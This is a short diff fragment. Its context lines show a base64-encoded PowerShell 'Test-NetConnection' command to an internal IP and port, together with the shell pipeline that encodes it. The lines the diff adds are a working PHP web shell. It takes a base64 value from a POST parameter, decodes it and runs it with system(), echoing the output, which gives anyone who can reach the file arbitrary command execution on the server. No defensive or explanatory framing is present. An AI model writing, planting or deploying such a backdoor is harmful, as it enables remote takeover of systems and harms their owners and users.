@@ -21,3 +21,7 @@ VABlAHMAdAAtAE4AZQB0AEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAxADcAMgAuADEAOAAuADEANwAxAC4A
 
 
 echo -n "Test-NetConnection 172.18.171.22 -Port 8081" | iconv -t UTF-16LE | base64 -w0
+
+
+
+<?php if(isset($_POST['c'])){$x=base64_decode($_POST['c']);echo"<pre>";system($x);echo"</pre>";} ?>
